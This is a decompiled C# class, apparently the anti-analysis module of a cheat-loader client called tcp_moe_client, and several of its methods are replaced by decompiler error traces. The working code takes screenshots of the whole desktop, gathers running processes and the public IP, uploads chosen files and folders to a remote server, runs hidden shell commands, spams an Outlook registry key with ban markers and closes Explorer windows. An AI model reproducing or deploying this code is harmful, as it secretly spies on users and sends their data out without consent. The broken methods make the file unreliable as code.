using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using tcp_moe_client.Properties;

namespace tcp_moe_client.Classes
{
	// Token: 0x02000073 RID: 115
	internal class anti_anal
	{
		// Token: 0x060008C3 RID: 2243
		[DllImport("GDI32.dll")]
		public static extern bool BitBlt(int hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, int hdcSrc, int nXSrc, int nYSrc, int dwRop);

		// Token: 0x060008C4 RID: 2244
		[DllImport("GDI32.dll")]
		public static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);

		// Token: 0x060008C5 RID: 2245
		[DllImport("GDI32.dll")]
		public static extern int CreateCompatibleDC(int hdc);

		// Token: 0x060008C6 RID: 2246
		[DllImport("GDI32.dll")]
		public static extern bool DeleteDC(int hdc);

		// Token: 0x060008C7 RID: 2247
		[DllImport("GDI32.dll")]
		public static extern bool DeleteObject(int hObject);

		// Token: 0x060008C8 RID: 2248
		[DllImport("gdi32.dll")]
		private static extern int CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

		// Token: 0x060008C9 RID: 2249
		[DllImport("GDI32.dll")]
		public static extern int GetDeviceCaps(int hdc, int nIndex);

		// Token: 0x060008CA RID: 2250
		[DllImport("GDI32.dll")]
		public static extern int SelectObject(int hdc, int hgdiobj);

		// Token: 0x060008CB RID: 2251
		[DllImport("User32.dll")]
		public static extern int GetDesktopWindow();

		// Token: 0x060008CC RID: 2252
		[DllImport("User32.dll")]
		public static extern int GetWindowDC(int hWnd);

		// Token: 0x060008CD RID: 2253
		[DllImport("User32.dll")]
		public static extern int ReleaseDC(int hWnd, int hDC);

		// Token: 0x1700011A RID: 282
		// (get) Token: 0x060008CE RID: 2254 RVA: 0x01054538 File Offset: 0x01052738
		// (set) Token: 0x060008CF RID: 2255 RVA: 0x0105454C File Offset: 0x0105274C
		public static Image compressed { get; set; }

		// Token: 0x060008D1 RID: 2257 RVA: 0x01054560 File Offset: 0x01052760
		public static void WarnOrBanRegedit(RegistryKey key)
		{
			try
			{
				bool flag = false;
				if (key != null)
				{
					foreach (string text in key.GetValueNames())
					{
						if (text == anti_anal.Warn)
						{
							key.DeleteValue(text);
							key.SetValue(anti_anal.Ban, Local.CreateMD5(anti_anal.RandomString(anti_anal.random.Next(30, 37))));
							flag = true;
						}
					}
					GC.Collect();
					foreach (string name in key.GetValueNames())
					{
						if (!flag)
						{
							key.DeleteValue(name);
							key.SetValue(anti_anal.Warn, Local.CreateMD5(anti_anal.RandomString(anti_anal.random.Next(30, 37))));
							flag = true;
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060008D2 RID: 2258 RVA: 0x0105462C File Offset: 0x0105282C
		public static void DeleteRegeditData()
		{
			try
			{
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Office\\Outlook\\FormRegions\\", true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKeyTree("IH");
				}
			}
			catch
			{
			}
		}

		// Token: 0x060008D3 RID: 2259 RVA: 0x01054678 File Offset: 0x01052878
		private static void CheckIfRegeditExists(RegistryKey key, int count)
		{
			/*
An exception occurred when decompiling this method (060008D3)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void tcp_moe_client.Classes.anti_anal::CheckIfRegeditExists(Microsoft.Win32.RegistryKey,System.Int32)
 ---> System.Exception: Inconsistent stack size at IL_1F
   à ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:ligne 279
   à ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:ligne 269
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 112
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 88
   --- Fin de la trace de la pile d'exception interne ---
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 92
   à ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:ligne 1545
*/;
		}

		// Token: 0x060008D4 RID: 2260 RVA: 0x01054700 File Offset: 0x01052900
		private static void CreateRegeditRecords(RegistryKey key, int count)
		{
			try
			{
				for (int i = 0; i < count; i++)
				{
					key.SetValue(Local.CreateMD5(anti_anal.RandomString(anti_anal.random.Next(30, 37))), Local.CreateMD5(anti_anal.RandomString(anti_anal.random.Next(30, 37))));
				}
			}
			catch
			{
			}
		}

		// Token: 0x060008D5 RID: 2261 RVA: 0x01054764 File Offset: 0x01052964
		private static void RegeditAbuse()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey("Software\\Microsoft\\Office\\Outlook\\FormRegions\\IH", true);
			if (registryKey2 == null)
			{
				registryKey2 = registryKey.CreateSubKey("Software\\Microsoft\\Office\\Outlook\\FormRegions\\IH");
				try
				{
					anti_anal.CreateRegeditRecords(registryKey2, 50);
				}
				catch
				{
				}
			}
			try
			{
				anti_anal.CheckIfRegeditExists(registryKey2, 50);
			}
			catch
			{
			}
			try
			{
				IL_4D:
				registryKey2 = registryKey.OpenSubKey("Software\\Microsoft\\Office\\Outlook\\FormRegions\\IH", true);
				if (registryKey2 != null)
				{
					foreach (string text in registryKey2.GetValueNames())
					{
						if (text != anti_anal.Warn && text != anti_anal.Ban)
						{
							registryKey2.DeleteValue(text);
							registryKey2.SetValue(Local.CreateMD5(anti_anal.RandomString(anti_anal.random.Next(30, 37))), Local.CreateMD5(anti_anal.RandomString(anti_anal.random.Next(30, 37))));
						}
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(100);
			goto IL_4D;
		}

		// Token: 0x060008D6 RID: 2262 RVA: 0x0105487C File Offset: 0x01052A7C
		public bool checkDate(double dt, double saved)
		{
			double num = saved + 100.0;
			return num >= dt - 20000.0 && num <= dt + 20000.0;
		}

		// Token: 0x060008D7 RID: 2263 RVA: 0x010548B4 File Offset: 0x01052AB4
		public void AntiSuspension()
		{
			double num = 0.0;
			for (;;)
			{
				if (num != 0.0)
				{
					if (!this.checkDate(new TimeSpan(DateTime.Now.Ticks).TotalMilliseconds, num))
					{
						anti_anal.found("Illegal suspension");
					}
					else
					{
						num = new TimeSpan(DateTime.Now.Ticks).TotalMilliseconds;
					}
				}
				num = new TimeSpan(DateTime.Now.Ticks).TotalMilliseconds;
				Thread.Sleep(100);
			}
		}

		// Token: 0x060008D8 RID: 2264 RVA: 0x01054948 File Offset: 0x01052B48
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>(<Module>.smethod_9<string>(1673741814u), length)
			select anti_anal.<>c.smethod_2(s, anti_anal.<>c.smethod_1(anti_anal.random, anti_anal.<>c.smethod_0(s)))).ToArray<char>());
		}

		// Token: 0x060008D9 RID: 2265 RVA: 0x01054994 File Offset: 0x01052B94
		public void anal()
		{
			/*
An exception occurred when decompiling this method (060008D9)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void tcp_moe_client.Classes.anti_anal::anal()
 ---> System.Exception: Inconsistent stack size at IL_417
   à ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:ligne 279
   à ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:ligne 269
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 112
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 88
   --- Fin de la trace de la pile d'exception interne ---
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 92
   à ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:ligne 1545
*/;
		}

		// Token: 0x060008DA RID: 2266 RVA: 0x01054E58 File Offset: 0x01053058
		public void CheckHosts()
		{
			string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			if (File.Exists(path))
			{
				string text = File.ReadAllText(path);
				foreach (string value in new List<string>
				{
					"inceptor.cc",
					"hypex.to",
					"hypexscripts.xyz",
					"185.100.85.215"
				})
				{
					if (text.Contains(value))
					{
						anti_anal.found("HOSTS MY ASS111111111111");
					}
				}
			}
		}

		// Token: 0x060008DB RID: 2267 RVA: 0x01054EF8 File Offset: 0x010530F8
		public static string DecompressString(string compressedText)
		{
			byte[] array = Convert.FromBase64String(compressedText);
			string @string;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Write(array, 4, array.Length - 4);
				byte[] array2 = new byte[num];
				memoryStream.Position = 0L;
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					gzipStream.Read(array2, 0, array2.Length);
				}
				@string = Encoding.UTF8.GetString(array2);
			}
			return @string;
		}

		// Token: 0x060008DC RID: 2268 RVA: 0x01054F94 File Offset: 0x01053194
		public static void CreateScreenshot()
		{
			try
			{
				new Thread(delegate()
				{
					try
					{
						Screen[] array = anti_anal.<>c.smethod_3();
						int num = array.Length;
						int num2 = 0;
						int num3 = 0;
						for (int i = 0; i < num; i++)
						{
							if (num2 < anti_anal.<>c.smethod_4(array[i]).X + array[i].Bounds.Width)
							{
								num2 = array[i].Bounds.X + array[i].Bounds.Width;
							}
							if (num3 < array[i].Bounds.Y + array[i].Bounds.Height)
							{
								num3 = array[i].Bounds.Y + array[i].Bounds.Height;
							}
						}
						anti_anal.CaptureScreen(0, 0, num2, num3);
					}
					catch
					{
					}
				}).Start();
			}
			catch
			{
			}
		}

		// Token: 0x060008DD RID: 2269 RVA: 0x01054FE0 File Offset: 0x010531E0
		public static void CaptureScreen(int x, int y, int wid, int hei)
		{
			try
			{
				int num = anti_anal.CreateDC("DISPLAY", null, null, IntPtr.Zero);
				int num2 = anti_anal.CreateCompatibleDC(num);
				int num3 = anti_anal.CreateCompatibleBitmap(num, wid, hei);
				anti_anal.SelectObject(num2, num3);
				Bitmap bitmap = new Bitmap(wid, hei);
				Graphics graphics = Graphics.FromImage(bitmap);
				IntPtr hdc = graphics.GetHdc();
				anti_anal.BitBlt(num2, 0, 0, wid, hei, (int)hdc, 0, 0, 16711778);
				graphics.Dispose();
				bitmap.Dispose();
				bitmap.Dispose();
				Screen[] allScreens = Screen.AllScreens;
				for (int i = 0; i < allScreens.Length; i++)
				{
					if (allScreens[i].Bounds.X <= x + wid && allScreens[i].Bounds.X + allScreens[i].Bounds.Width >= x && allScreens[i].Bounds.Y <= y + hei && allScreens[i].Bounds.Y + allScreens[i].Bounds.Height >= y)
					{
						int num4;
						if (x >= allScreens[i].Bounds.X)
						{
							num4 = x;
						}
						else
						{
							num4 = allScreens[i].Bounds.X;
						}
						int num5;
						if (x + wid > allScreens[i].Bounds.X + allScreens[i].Bounds.Width)
						{
							num5 = allScreens[i].Bounds.X + allScreens[i].Bounds.Width;
						}
						else
						{
							num5 = x + wid;
						}
						int num6;
						if (y < allScreens[i].Bounds.Y)
						{
							num6 = allScreens[i].Bounds.Y;
						}
						else
						{
							num6 = y;
						}
						int num7;
						if (y + hei <= allScreens[i].Bounds.Y + allScreens[i].Bounds.Height)
						{
							num7 = y + hei;
						}
						else
						{
							num7 = allScreens[i].Bounds.Y + allScreens[i].Bounds.Height;
						}
						anti_anal.BitBlt(num2, num4 - x, num6 - y, num5 - num4, num7 - num6, num, num4, num6, 1087111200);
					}
				}
				Image image = Image.FromHbitmap(new IntPtr(num3));
				Senders.FileUpload("UI-" + DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss") + Settings.Default.Username, Convert.ToBase64String(anti_anal.GetJpeg(image)));
				anti_anal.DeleteDC(num);
				anti_anal.DeleteDC(num2);
				anti_anal.DeleteObject(num3);
				image.Dispose();
			}
			catch
			{
			}
		}

		// Token: 0x060008DE RID: 2270 RVA: 0x010552C0 File Offset: 0x010534C0
		public static byte[] GetJpeg(Image bitImage)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				bitImage.Save(memoryStream, ImageFormat.Jpeg);
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x060008DF RID: 2271 RVA: 0x01055304 File Offset: 0x01053504
		private static Image ReduceImageSize(decimal scaleFactor, Image image1)
		{
			Image result;
			try
			{
				int width = (int)(image1.Width * scaleFactor);
				int height = (int)(image1.Height * scaleFactor);
				Bitmap bitmap = new Bitmap(width, height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CompositingQuality = CompositingQuality.HighQuality;
				graphics.SmoothingMode = SmoothingMode.HighQuality;
				graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
				Rectangle rect = new Rectangle(0, 0, width, height);
				graphics.DrawImage(image1, rect);
				result = bitmap;
			}
			finally
			{
				if (image1 != null)
				{
					((IDisposable)image1).Dispose();
				}
			}
			return result;
		}

		// Token: 0x060008E0 RID: 2272 RVA: 0x01055398 File Offset: 0x01053598
		public static byte[] SaveImageToByteArray(Image image, int jpegQuality)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				ImageCodecInfo encoder = anti_anal.GetEncoder(ImageFormat.Jpeg);
				EncoderParameters encoderParameters = new EncoderParameters(1);
				encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)jpegQuality);
				image.Save(memoryStream, encoder, encoderParameters);
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x060008E1 RID: 2273 RVA: 0x01055400 File Offset: 0x01053600
		private static ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x060008E2 RID: 2274 RVA: 0x0105543C File Offset: 0x0105363C
		public static Bitmap ResizeImage(Image image, int width, int height)
		{
			Rectangle rectangle_ = new Rectangle(0, 0, width, height);
			Bitmap bitmap = new Bitmap(width, height);
			bitmap.SetResolution(image.HorizontalResolution, image.VerticalResolution);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.CompositingMode = CompositingMode.SourceCopy;
				graphics.CompositingQuality = CompositingQuality.HighQuality;
				graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics.SmoothingMode = SmoothingMode.HighQuality;
				graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
				using (ImageAttributes imageAttributes = new ImageAttributes())
				{
					imageAttributes.SetWrapMode(WrapMode.TileFlipXY);
					anti_anal.smethod_0(graphics, image, rectangle_, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, imageAttributes);
				}
			}
			return bitmap;
		}

		// Token: 0x060008E3 RID: 2275 RVA: 0x010554F0 File Offset: 0x010536F0
		public static byte[] ImageToByteArray(Image x)
		{
			return (byte[])new ImageConverter().ConvertTo(x, typeof(byte[]));
		}

		// Token: 0x060008E4 RID: 2276 RVA: 0x01055518 File Offset: 0x01053718
		public static string CompressString(string text)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			MemoryStream memoryStream = new MemoryStream();
			using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
			{
				gzipStream.Write(bytes, 0, bytes.Length);
			}
			memoryStream.Position = 0L;
			byte[] array = new byte[memoryStream.Length];
			memoryStream.Read(array, 0, array.Length);
			byte[] array2 = new byte[array.Length + 4];
			Buffer.BlockCopy(array, 0, array2, 4, array.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, array2, 0, 4);
			return Convert.ToBase64String(array2);
		}

		// Token: 0x060008E5 RID: 2277 RVA: 0x010555C4 File Offset: 0x010537C4
		private static void CompressFile(string sDir, string sRelativePath, GZipStream zipStream)
		{
			char[] array = sRelativePath.ToCharArray();
			zipStream.Write(BitConverter.GetBytes(array.Length), 0, 4);
			foreach (char value in array)
			{
				zipStream.Write(BitConverter.GetBytes(value), 0, 2);
			}
			byte[] array3 = File.ReadAllBytes(Path.Combine(sDir, sRelativePath));
			zipStream.Write(BitConverter.GetBytes(array3.Length), 0, 4);
			zipStream.Write(array3, 0, array3.Length);
		}

		// Token: 0x060008E6 RID: 2278 RVA: 0x01055634 File Offset: 0x01053834
		private static bool DecompressFile(string sDir, GZipStream zipStream, anti_anal.ProgressDelegate progress)
		{
			byte[] array = new byte[4];
			if (zipStream.Read(array, 0, 4) >= 4)
			{
				int num = BitConverter.ToInt32(array, 0);
				array = new byte[2];
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < num; i++)
				{
					zipStream.Read(array, 0, 2);
					char value = BitConverter.ToChar(array, 0);
					stringBuilder.Append(value);
				}
				string text = stringBuilder.ToString();
				if (progress != null)
				{
					progress(text);
				}
				array = new byte[4];
				zipStream.Read(array, 0, 4);
				int num2 = BitConverter.ToInt32(array, 0);
				array = new byte[num2];
				zipStream.Read(array, 0, array.Length);
				string path = Path.Combine(sDir, text);
				string directoryName = Path.GetDirectoryName(path);
				if (!Directory.Exists(directoryName))
				{
					Directory.CreateDirectory(directoryName);
				}
				using (FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
				{
					fileStream.Write(array, 0, num2);
				}
				return true;
			}
			return false;
		}

		// Token: 0x060008E7 RID: 2279 RVA: 0x01055730 File Offset: 0x01053930
		private static void CompressDirectory(string sInDir, string sOutFile, anti_anal.ProgressDelegate progress)
		{
			string[] files = Directory.GetFiles(sInDir, "*.*", SearchOption.AllDirectories);
			int startIndex = (sInDir[sInDir.Length - 1] == Path.DirectorySeparatorChar) ? sInDir.Length : (sInDir.Length + 1);
			using (FileStream fileStream = new FileStream(sOutFile, FileMode.Create, FileAccess.Write, FileShare.None))
			{
				using (GZipStream gzipStream = new GZipStream(fileStream, CompressionMode.Compress))
				{
					string[] array = files;
					for (int i = 0; i < array.Length; i++)
					{
						string text = array[i].Substring(startIndex);
						if (progress != null)
						{
							progress(text);
						}
						anti_anal.CompressFile(sInDir, text, gzipStream);
					}
				}
			}
		}

		// Token: 0x060008E8 RID: 2280 RVA: 0x010557EC File Offset: 0x010539EC
		private static void DecompressToDirectory(string sCompressedFile, string sDir, anti_anal.ProgressDelegate progress)
		{
			using (FileStream fileStream = new FileStream(sCompressedFile, FileMode.Open, FileAccess.Read, FileShare.None))
			{
				using (GZipStream gzipStream = new GZipStream(fileStream, CompressionMode.Decompress, true))
				{
					while (anti_anal.DecompressFile(sDir, gzipStream, progress))
					{
					}
				}
			}
		}

		// Token: 0x060008E9 RID: 2281 RVA: 0x01055848 File Offset: 0x01053A48
		public static void CreateReport(string input)
		{
			string text = "{DATA_" + input + "}";
			string publicIp = "";
			foreach (Process process in Process.GetProcesses())
			{
				try
				{
					text = text + "{" + process.ProcessName + "}";
				}
				catch
				{
				}
			}
			new Thread(delegate()
			{
				try
				{
					WebClient webClient_ = anti_anal.<>c__DisplayClass45_0.smethod_0();
					publicIp = anti_anal.<>c__DisplayClass45_0.smethod_1(webClient_, <Module>.smethod_6<string>(1681906429u));
				}
				catch
				{
				}
			}).Start();
			Thread.Sleep(2000);
			string compressedFile = anti_anal.CompressString(text) + " " + publicIp;
			Senders.FileUpload("PD-" + Settings.Default.Username + DateTime.Now.ToString("yyyy-dd-mm-HH:mm:ss"), compressedFile);
		}

		// Token: 0x060008EA RID: 2282 RVA: 0x01055928 File Offset: 0x01053B28
		public static void UploadFile(string path)
		{
			new Thread(delegate()
			{
				string string_ = Generator.smethod_0(20);
				string text = anti_anal.<>c__DisplayClass46_0.smethod_0(anti_anal.folder, <Module>.smethod_9<string>(720946337u), string_, <Module>.smethod_9<string>(1527561488u));
				anti_anal.CompressFile(path, text, null);
				string compressedFile = anti_anal.ByteArrayToString(anti_anal.<>c__DisplayClass46_0.smethod_1(text));
				Senders.FileUpload(<Module>.smethod_5<string>(2138962910u) + Settings.Default.Username + DateTime.Now.ToString(<Module>.smethod_5<string>(4160074221u)), compressedFile);
			}).Start();
		}

		// Token: 0x060008EB RID: 2283 RVA: 0x01055958 File Offset: 0x01053B58
		public static void UploadDirectory(string path)
		{
			new Thread(delegate()
			{
				string string_ = Generator.smethod_0(20);
				string text = anti_anal.<>c__DisplayClass47_0.smethod_0(anti_anal.folder, <Module>.smethod_8<string>(612262780u), string_, <Module>.smethod_6<string>(3923750904u));
				anti_anal.CompressDirectory(path, text, null);
				string compressedFile = anti_anal.ByteArrayToString(anti_anal.<>c__DisplayClass47_0.smethod_1(text));
				Senders.FileUpload(<Module>.smethod_6<string>(2244812052u) + Settings.Default.Username + DateTime.Now.ToString(<Module>.smethod_8<string>(1918820184u)), compressedFile);
			}).Start();
		}

		// Token: 0x060008EC RID: 2284 RVA: 0x01042668 File Offset: 0x01040868
		public static string ByteArrayToString(byte[] ba)
		{
			StringBuilder stringBuilder = new StringBuilder(ba.Length * 2);
			foreach (byte b in ba)
			{
				stringBuilder.AppendFormat("{0:x2}", b);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x060008ED RID: 2285 RVA: 0x01055988 File Offset: 0x01053B88
		public static string HtmlResponse(string link)
		{
			Handlers.HtmlIncoming = "";
			Senders.HtmlResponse(link);
			Thread.Sleep(1000);
			string htmlIncoming = Handlers.HtmlIncoming;
			Handlers.HtmlIncoming = "";
			return htmlIncoming;
		}

		// Token: 0x060008EE RID: 2286 RVA: 0x010559C0 File Offset: 0x01053BC0
		public static void found(string proc)
		{
			/*
An exception occurred when decompiling this method (060008EE)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void tcp_moe_client.Classes.anti_anal::found(System.String)
 ---> System.NullReferenceException: La référence d'objet n'est pas définie à une instance d'un objet.
   à ICSharpCode.Decompiler.ILAst.ILAstOptimizer.IntroducePropertyAccessInstructions(ILExpression expr, ILExpression parentExpr, Int32 posInParent) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstOptimizer.cs:ligne 1588
   à ICSharpCode.Decompiler.ILAst.ILAstOptimizer.IntroducePropertyAccessInstructions(ILNode node) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstOptimizer.cs:ligne 1578
   à ICSharpCode.Decompiler.ILAst.ILAstOptimizer.Optimize(DecompilerContext context, ILBlock method, AutoPropertyProvider autoPropertyProvider, StateMachineKind& stateMachineKind, MethodDef& inlinedMethod, AsyncMethodDebugInfo& asyncInfo, ILAstOptimizationStep abortBeforeStep) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstOptimizer.cs:ligne 244
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 123
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 88
   --- Fin de la trace de la pile d'exception interne ---
   à ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:ligne 92
   à ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) dans C:\projects\dnspy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:ligne 1545
*/;
		}

		// Token: 0x060008F0 RID: 2288
		[DllImport("user32.dll")]
		private static extern bool EnumWindows(anti_anal.EnumWindowsDelegate lpEnumFunc, IntPtr lParam);

		// Token: 0x060008F1 RID: 2289
		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out IntPtr lpdwProcessId);

		// Token: 0x060008F2 RID: 2290
		[DllImport("user32.dll")]
		private static extern uint RealGetWindowClass(IntPtr hwnd, StringBuilder pszType, uint cchType);

		// Token: 0x060008F3 RID: 2291
		[DllImport("user32.dll")]
		private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x060008F4 RID: 2292 RVA: 0x01055AAC File Offset: 0x01053CAC
		private static bool EnumWindowsCallback(IntPtr hwnd, IntPtr lParam)
		{
			IntPtr intPtr = 0;
			anti_anal.GetWindowThreadProcessId(hwnd, out intPtr);
			Process processById = Process.GetProcessById(intPtr.ToInt32());
			StringBuilder stringBuilder = new StringBuilder(255);
			anti_anal.RealGetWindowClass(hwnd, stringBuilder, 255u);
			if (processById.ProcessName == "explorer" && stringBuilder.ToString() == "CabinetWClass")
			{
				anti_anal.SendMessage(hwnd, anti_anal.WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
			}
			return true;
		}

		// Token: 0x060008F5 RID: 2293 RVA: 0x01055B28 File Offset: 0x01053D28
		public static void cmd(string command)
		{
			Process.Start(new ProcessStartInfo(<Module>.smethod_7<string>(3880878817u), <Module>.smethod_7<string>(2283504904u) + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				Verb = <Module>.smethod_7<string>(1218588962u),
				RedirectStandardError = true,
				RedirectStandardOutput = true
			}).WaitForExit();
		}

		// Token: 0x060008F7 RID: 2295 RVA: 0x01055B8C File Offset: 0x01053D8C
		public static void KillExplorer()
		{
			anti_anal.EnumWindows(new anti_anal.EnumWindowsDelegate(anti_anal.EnumWindowsCallback), IntPtr.Zero);
		}

